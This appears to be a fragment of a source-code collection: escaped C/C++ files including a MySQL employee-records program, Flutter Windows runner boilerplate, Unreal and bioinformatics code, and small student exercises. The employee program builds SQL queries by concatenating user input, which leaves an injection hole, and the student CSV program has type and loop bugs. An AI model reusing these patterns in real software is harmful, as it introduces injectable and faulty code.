AvgExp FROM EmployeeTable\");\n\n        if (res->next()) {\n            cout << \"Average Experience of all employees: \" << res->getDouble(\"AvgExp\") << \" years\\n\";\n        }\n        else {\n            cout << \"Error calculating average experience\\n\";\n        }\n\n        delete res;\n        delete stmt;\n\n        closeMySQL(); // Close MySQL connection\n\n        showMenu();\n    }\n\n    // Function to sort employees by their ID\n    void sortEmployeesByID() {\n        initMySQL(); // Initialize MySQL connection\n\n        sql::Statement* stmt = con->createStatement();\n        sql::ResultSet* res = stmt->executeQuery(\"SELECT * FROM EmployeeTable ORDER BY EmployeeID\");\n\n        cout << \"Employee Records Sorted by ID:\\n\";\n        cout << \"----------------------------------------\\n\";\n        cout << \"ID\\tName\\t\\tDesignation\\tExperience\\tAge\\n\";\n        cout << \"----------------------------------------\\n\";\n\n        while (res->next()) {\n            cout << res->getInt(\"EmployeeID\") << \"\\t\" << res->getString(\"Name\") << \"\\t\" << res->getString(\"Designation\") << \"\\t\" << res->getInt(\"Experience\") << \"\\t\" << res->getInt(\"Age\") << \"\\n\";\n        }\n\n        cout << \"----------------------------------------\\n\";\n\n        delete res;\n        delete stmt;\n\n        closeMySQL(); // Close MySQL connection\n\n        showMenu();\n    }\n\npublic:\n    // Function to build the given datatype\n    void build() {\n        cout << \"insert into The Table\\n\";\n        cout << \"Maximum Entries can be \" << max << \"\\n\";\n\n        cout << \"Enter the number of Entries required: \";\n        cin >> num;\n\n        if (num > 20) {\n            cout << \"Maximum number of Entries is 20\\n\";\n            num = 20;\n        }\n\n        initMySQL(); // Initialize MySQL connection\n\n        cout << \"Enter the following data:\\n\";\n\n        for (int i = 0; i < num; i++) {\n            cout << \"Name: \";\n            cin >> emp[i].name;\n\n            cout << \"Employee ID: \";\n            cin >> emp[i].code;\n\n            cout << \"Designation: \";\n            cin >> emp[i].designation;\n\n            cout << \"Experience: \";\n            cin >> emp[i].exp;\n\n            cout << \"Age: \";\n            cin >> emp[i].age;\n\n            // Insert into MySQL\n            insertIntoMySQL(i);\n        }\n\n        closeMySQL(); // Close MySQL connection\n\n        showMenu();\n    }\n\n    // Function to update employee data\n    void update() {\n        initMySQL(); // Initialize MySQL connection\n\n        cout << \"Enter the Employee ID to update: \";\n        long int empID;\n        cin >> empID;\n\n        // Check if the employee ID exists\n        sql::Statement* stmt = con->createStatement();\n        sql::ResultSet* res = stmt->executeQuery(\"SELECT * FROM EmployeeTable WHERE EmployeeID = \" + to_string(empID));\n\n        if (!res->next()) {\n            cout << \"Employee not found!\\n\";\n        }\n        else {\n            // Update employee data\n            cout << \"Enter the new data:\\n\";\n            cout << \"Name: \";\n            cin >> emp[0].name; // Assuming only the name is updated for simplicity\n\n            stmt->execute(\"UPDATE EmployeeTable SET Name = '\" + emp[0].name + \"' WHERE EmployeeID = \" + to_string(empID));\n            cout ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n#include \"MovingPlatform.h\"\n\n\nDEFINE_LOG_CATEGORY(LogTemplateCharacter);\n\n// Sets default values\nAMovingPlatform::AMovingPlatform()\n{\n\tPrimaryActorTick.bCanEverTick = true;\n}\n\n// Called when the game starts or when spawned\nvoid AMovingPlatform::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\t\n\n\t//get actor location\n\tStartActorLocation = GetActorLocation();\n\t//settting the offsets\n\tMoveOffsetNorm = MoveOffset;\n\tMoveOffsetNorm.Normalize();\n\n\t//setting tick function to Moveenable\n\tSetActorTickEnabled(MoveEnable);\n\n\n\t//get a name of all the actors\n\tFString Name = GetName();\n\n\tUE_LOG(LogTemplateCharacter, Display, TEXT(\"Begin Play: %s\"),*Name);\n}\n\n// Called every frame\nvoid AMovingPlatform::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n\t//using seprate function\n\tMovePlatform(DeltaTime);\n\n\tRotatePlatform(DeltaTime);\n\t\n\t//setting new actor location\n\tSetActorLocation(StartActorLocation + MoveOffsetNorm * CurDistance);\n\t\n\n}\n\nvoid AMovingPlatform::MovePlatform(float Delta)\n{\n\t//if move enable call this\n\tif (MoveEnable)\n\t{\n\t\t//changing currnt direction\n\t\tCurDistance += Delta * Speed * movedirection;\n\n\t\t//cheacking if its reach max distance change the direction\n\t\tif (CurDistance >= maxDistance || CurDistance <= 0.0f)\n\t\t{\n\t\t\tmovedirection *= -1;\n\t\t}\n\t}\n}\n\nvoid AMovingPlatform::RotatePlatform(float Delta)\n{\n\tFRotator CurrentRotation = GetActorRotation();\n\tCurrentRotation = CurrentRotation + RotationVelocity * Delta;\n\tSetActorRotation(CurrentRotation);\n\n\tAddActorLocalRotation(RotationVelocity * Delta);\n}\n\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n\r\ntypedef struct\r\n{\r\n\tint nim[10];\r\n\tchar nama[50];\r\n\tint umur;\r\n\tchar alamat[100];\r\n} Mahasiswa;\r\n\r\nvoid tambahData(char *filename)\r\n{\r\n\tMahasiswa mahasiswa;\r\n\tprintf(\"Masukkan nim: \");\r\n\tscanf(\"%d\", &mahasiswa.nim);\r\n\tgetchar();\r\n\t\r\n\tprintf(\"Masukkan nama mahasiswa: \");\r\n\tfgets(mahasiswa.nama, 50, stdin);\r\n\tmahasiswa.nama[strcspn(mahasiswa.nama, \"\\n\")] = 0;\r\n\t\r\n\tprintf(\"Masukkan umur: \");\r\n\tscanf(\"%d\", &mahasiswa.umur);\r\n\tgetchar();\r\n\t\r\n\tprintf(\"Masukkan alamat: \");\r\n\tfgets(mahasiswa.alamat, 100, stdin);\r\n\tmahasiswa.alamat[strcspn(mahasiswa.alamat, \"\\n\")] = 0;\r\n\t\r\n\tprintf(\"\\n\\n\");\r\n\t\r\n\tFILE *fp = fopen(filename, \"a\");\r\n\tif(fp == NULL)\r\n\t{\r\n\t\tprintf(\"Gagal membuka file %s\\n\", filename);\r\n\t\texit(-1);\r\n\t}\r\n\t\r\n\tfprintf(fp, \"%d, %s, %d, %s\\n\", mahasiswa.nim, mahasiswa.nama, mahasiswa.umur, mahasiswa.alamat);\r\n\tfclose(fp);\r\n}\r\n\r\nvoid tampilkanData(char *filename) \r\n{\r\n    FILE *fp = fopen(filename, \"r\");\r\n    if (fp == NULL) \r\n\t{\r\n        printf(\"Gagal membuka file %s\\n\", filename);\r\n        exit(-1);\r\n    }\r\n\r\n\tMahasiswa mahasiswa;\r\n    printf(\"Data yang tersimpan dalam file %s:\\n\", filename);\r\n    printf(\"NIM, Nama, Umur, Alamat\\n\"); // Header tabel\r\n\r\n    // Membaca dan menampilkan data\r\n    while (fscanf(fp, \"%d, %49[^,],%d,%99[^\\n]\\n\", &mahasiswa.nim, mahasiswa.nama, &mahasiswa.umur, mahasiswa.alamat) == 4) \r\n\t{\r\n        printf(\"%d, %s, %d, %s\\n\", mahasiswa.nim, mahasiswa.nama, mahasiswa.umur, mahasiswa.alamat);\r\n    }\r\n    \r\n    printf(\"\\n\\n\");\r\n\r\n    fclose(fp);\r\n}\r\n\r\n\r\nint main() {\r\n    char *filename = \"output7.csv\";\r\n    int pilihan;\r\n\tdo\r\n\t{\r\n\t    printf(\"Pilih operasi:\\n\");\r\n\t    printf(\"1. Tambah data baru\\n\");\r\n//\t    printf(\"2. Edit data\\n\");\r\n\t    printf(\"2. Tampilkan data\\n\");\r\n\t    printf(\"Pilihan Anda: \");\r\n\t    scanf(\"%d\", &pilihan);\r\n\t    getchar();\r\n\t\r\n\t    switch (pilihan) {\r\n\t        case 1:\r\n\t            tambahData(filename);\r\n\t            break;\r\n/*\t        case 2:\r\n\t            editData(filename);\r\n\t            break;\r\n*/\t        case 2:\r\n\t            tampilkanData(filename);\r\n\t            break;\r\n\t        default:\r\n\t            printf(\"Pilihan tidak valid.\\n\");\r\n\t    }\r\n\t} \r\n\twhile (pilihan != 3);\r\n\t\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <cmath>\n#include <vector>\n#include <algorithm>\n#include <set>\n#include <random>\n#include <numeric>\n\nconstexpr int POPULATION_SIZE = 1000;\nconstexpr int MAX_GENERATIONS = 10000;\nconstexpr double MUTATION_RATE = 0.7;\nconstexpr double MIN_VAL = 0.0;\nconstexpr double MAX_VAL = 1.0;\n\n// Use random number engine for better random number generation\nstd::random_device rd;\nstd::mt19937 gen(rd());\n\ndouble randVal(double min_val_, double max_val_)\n{\n    std::uniform_real_distribution<double> dis(min_val_, max_val_);\n    return dis(gen);\n}\n\n// The problem to optimize\ndouble foo(const double & x, const double & y, const double & z)\n{\n    return fabs(6 * pow(x, 3) + 9 * pow(y, 2) + 90 * z - 25);\n}\n\n// 2. Fitness Evaluation - Evaluate the fitness of each solution in the population based on some predefined criteria\ndouble fitnessEval(const double & x, const double & y, const double & z)\n{\n    double ans = foo(x, y, z);\n    return (ans == 0) ? INT_MAX : fabs(1 / ans);\n}\n\n// A potential solution\nstruct Solution\n{\n    double x, y, z;\n\tdouble fitness;\n\n    Solution() = default;\n\n    Solution(const double & x_, const double & y_, const double & z_)\n        : x(x_)\n        , y(y_)\n        , z(z_)\n        , fitness(fitnessEval(x_, y_, z_)) {}\n\n    bool operator>(const Solution & other) const\n    {\n        return fitness > other.fitness;\n    }\n\n    friend std::ostream & operator<<(std::ostream & os, const Solution & obj)\n    {\n        os << \"x = \" << obj.x << \", \"\n           << \"y = \" << obj.y << \", \"\n           << \"z = \" << obj.z << \", \"\n           << \"Fitness = \" << obj.fitness;\n        return os;\n    }\n};\n\n// 1. Initialization - Generate an initial population of potential solutions randomly\nvoid initPopulation(std::vector<Solution> & population)\n{\n\tfor (int i = 0; i < POPULATION_SIZE; ++i)\n\t{\n        population[i] = Solution(randVal(MIN_VAL, MAX_VAL), randVal(MIN_VAL, MAX_VAL), randVal(MIN_VAL, MAX_VAL));\n\t}\n}\n\n// 3. Selection - Select individuals from the current population based on their fitness, favoring better individuals\nvoid selection(std::vector<Solution> & population)\n{\n    population.resize((size_t)(std::ceil(population.size() * 0.6)));\n}\n\n// 4. Recombination (Crossover) - Create new solutions by combining genetic material from selected individuals\nSolution crossover(const Solution & parent1, const Solution & parent2)\n{\n    Solution child((parent1.x + parent2.x) / 2.0, (parent1.y + parent2.y) / 2.0, (parent1.z + parent2.z) / 2.0);\n    return child;\n}\n\n// 5. Mutation - Introduce random changes in the new solutions to maintain genetic diversity and explore new regions of the solution space\nvoid mutate(Solution & child)\n{\n    if (randVal(0, 1) < MUTATION_RATE)\n    {\n        child.x *= randVal(0.99, 1.01);\n        child.y *= randVal(0.99, 1.01);\n        child.z *= randVal(0.99, 1.01);\n        child.fitness = fitnessEval(child.x, child.y, child.z);\n    }\n}\n\nstd::vector<Solution> generation(std::vector<Solution> & population)\n{\n    selection(population);\n    std::vector<Solution> newPopulation;\n\n    std::uniform_int_distribution<int> dis(0, population.size() - 1);\n    for (int i = 0; i < population.size(); i += 2)\n    {\n        Solution child = crossover(population[dis(gen)], population[dis(gen)]);\n        mutate(child);\n        newPopulation.push_back(child); // 6. Replacement - Replace the old population with the new population of solutions\n    }\n\n    return newPopulation;\n}\n\nvoid geneticAlgorithm()\n{\n    std::vector<Solution> population(POPULATION_SIZE);\n\n    initPopulation(population);\n    std::sort(population.begin(), population.end(), std::greater<Solution>());\n    std::cout << \"Generation \" << 0 << \" best solution: \" << std::endl << population[0] << std::endl;\n\n    for (int i = 1; i <= MAX_GENERATIONS; ++i)\n    {\n        population = generation(population);\n        std::sort(population.begin(), population.end(), std::greater<Solution>());\n        std::cout << \"Generation \" << i << \" best solution: \" << std::endl << population[0] << std::endl;\n\n        // 7. Termination - Check if termination conditions are met (satisfactory solution found or maximum number of generations reached)\n        if (population[0].fitness > 999)\n        {\n            break;\n        }\n    }\n\n    std::cout << \"foo(x, y, z) = \" << foo(population[0].x, population[0].y, population[0].z);\n\n    int a;\n    std::cin >> a;\n}\n\nint main()\n{\n    geneticAlgorithm();\n    return 0;\n}\n",
    "#include <iostream>\n#include <dirent.h>\n#include <string>\n#include <iomanip>\n#include <sys/stat.h>\n\nusing namespace std;\n\nint main() {\nstring directory_path;\n\nwhile (true) {\n    cout << \":\";\n    getline(cin, directory_path);\n\n    DIR* dir = opendir(directory_path.c_str());\n    if (dir == NULL) {\n        cerr << \"Error: Unable to open directory.\" << endl;\n        continue;}\n\n    struct dirent* entry;\n    while ((entry = readdir(dir)) != NULL) {\n        string file_name(entry->d_name);        \n        if (file_name == \".\" || file_name == \"..\") \n            continue;\n        string full_path = directory_path + \"/\" + file_name;\n\n        struct stat file_stat;\n        stat(full_path.c_str(), &file_stat);\n\n        if (S_ISDIR(file_stat.st_mode)) // if folder:\n            cout << std::setw(15) <<  file_name << \"/\" << endl; \n        else {                          // if file:\n            // Round up to nearest 4KB block\n            long file_size_kb = (file_stat.st_size + 4095) / 1024; \n\n            cout << std::setw(16) << file_name.substr(0, 16)\n                << \" | \" << file_size_kb << \" KB\" << endl;\n        }\n    }\n    closedir(dir);\n}\nreturn 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"IlluminaPEReadClassifier.hpp\"\n\n#include \"io/BamConfig.hpp\"\n\nIlluminaPEReadClassifier::IlluminaPEReadClassifier(BamConfig const& bam_cfg)\n    : bam_cfg_(bam_cfg)\n{\n}\n\n// Given the set of features described in the argument list, classify a read\n// pair under the assumption that both reads are mapped to the same\n// chromosome/sequence.\nReadFlag pe_classify(\n    bool read_reversed,\n    bool mate_reversed,\n    bool leftmost,\n    bool proper_pair,\n    bool large_insert,\n    bool small_insert)\n{\n    // If both reads have the same orientation, then this is an abnormally\n    // oriented read pair. We don't care about the other features in such\n    // cases.\n    if (read_reversed == mate_reversed) {\n        return read_reversed ? ARP_RR : ARP_FF;\n    }\n\n    // For paired-end data, the \"leftmost\" read (the read with strictly smaller\n    // position on the same chromosome) should always align to the forward\n    // strand, and the non-leftmost to the reverse. We already know that\n    // the strands are different due to the previous condition, so if the\n    // leftmost read is reversed, the other is not. We can classify a read as\n    // RF whenever the leftmost flag is equal to the reversed flag:\n    //    leftmost read is reversed -> RF\n    //    !leftmost read is !reversed -> RF\n    if (leftmost == read_reversed) {\n        return ARP_RF;\n    }\n\n    // We have already dealt with FF, FR, and RF orientations. At this point\n    // we are surely dealing with a pair with FR orientation. Let's check the\n    // insert size. The large and small _insert flags should not be true\n    // simultaneously (unless there is a coding error), so the order of the\n    // tests doesn't really matter.\n    if (large_insert) {\n        return ARP_LARGE_INSERT;\n    }\n\n    if (small_insert) {\n        return ARP_SMALL_INSERT;\n    }\n\n    // The pair is FR oriented, not too small and not too large. It is in fact\n    // juuuust right. Only one option left:\n    return NORMAL_FR;\n}\n\n\nReadFlag IlluminaPEReadClassifier::classify(Alignment const& aln) const {\n    int sam_flag = aln.sam_flag();\n    LibraryConfig const& lib_config = bam_cfg_.library_config(aln.lib_index());\n\n    // These features can completely determine the outcome.\n    // We'll treat them first to reduce the size of the truth table required\n    // to analyze this function.\n    bool dup = sam_flag & BAM_FDUP;\n    bool paired = sam_flag & BAM_FPAIRED;\n    bool unmapped = sam_flag & BAM_FUNMAP;\n    bool mate_unmapped = sam_flag & BAM_FMUNMAP;\n    bool interchrom_pair = aln.interchrom_pair();\n\n    if(dup || !paired) {\n        return NA;\n    }\n    if (unmapped) {\n        return UNMAPPED;\n    }\n    if (mate_unmapped) {\n        return MATE_UNMAPPED;\n    }\n    if (interchrom_pair) {\n        return ARP_CTX;\n    }\n\n\n    // These features can have interactions.\n    bool read_reversed = sam_flag & BAM_FREVERSE;\n    bool mate_reversed = sam_flag & BAM_FMREVERSE;\n    bool leftmost = aln.leftmost();\n    bool proper_pair = aln.proper_pair();\n    bool large_insert = aln.abs_isize() > lib_config.uppercutoff;\n    bool small_insert = aln.abs_isize() < lib_config.lowercutoff;\n\n    return pe_classify(\n        read_reversed,\n        mate_reversed,\n        leftmost,\n        proper_pair,\n        large_insert,\n        small_insert);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"responsive_design\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_todo_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Ndef.h\"\n\n#ifdef NDEF_USE_SERIAL\n// Borrowed from Adafruit_NFCShield_I2C\nvoid PrintHex(const byte * data, const long numBytes)\n{\n  int32_t szPos;\n  for (szPos=0; szPos < numBytes; szPos++)\n  {\n    Serial.print(\"0x\");\n    // Append leading 0 for small values\n    if (data[szPos] <= 0xF)\n      Serial.print(\"0\");\n    Serial.print(data[szPos]&0xff, HEX);\n    if ((numBytes > 1) && (szPos != numBytes - 1))\n    {\n      Serial.print(\" \");\n    }\n  }\n  Serial.println(\"\");\n}\n\n// Borrowed from Adafruit_NFCShield_I2C\nvoid PrintHexChar(const byte * data, const long numBytes)\n{\n  int32_t szPos;\n  for (szPos=0; szPos < numBytes; szPos++)\n  {\n    // Append leading 0 for small values\n    if (data[szPos] <= 0xF)\n      Serial.print(\"0\");\n    Serial.print(data[szPos], HEX);\n    if ((numBytes > 1) && (szPos != numBytes - 1))\n    {\n      Serial.print(\" \");\n    }\n  }\n  Serial.print(\"  \");\n  for (szPos=0; szPos < numBytes; szPos++)\n  {\n    if (data[szPos] <= 0x1F)\n      Serial.print(\".\");\n    else\n      Serial.print((char)data[szPos]);\n  }\n  Serial.println(\"\");\n}\n\n// Note if buffer % blockSize != 0, last block will not be written\nvoid DumpHex(const byte * data, const long numBytes, const unsigned int blockSize)\n{\n    int i;\n    for (i = 0; i < (numBytes / blockSize); i++)\n    {\n        PrintHexChar(data, blockSize);\n        data += blockSize;\n    }\n}\n#endif\n",
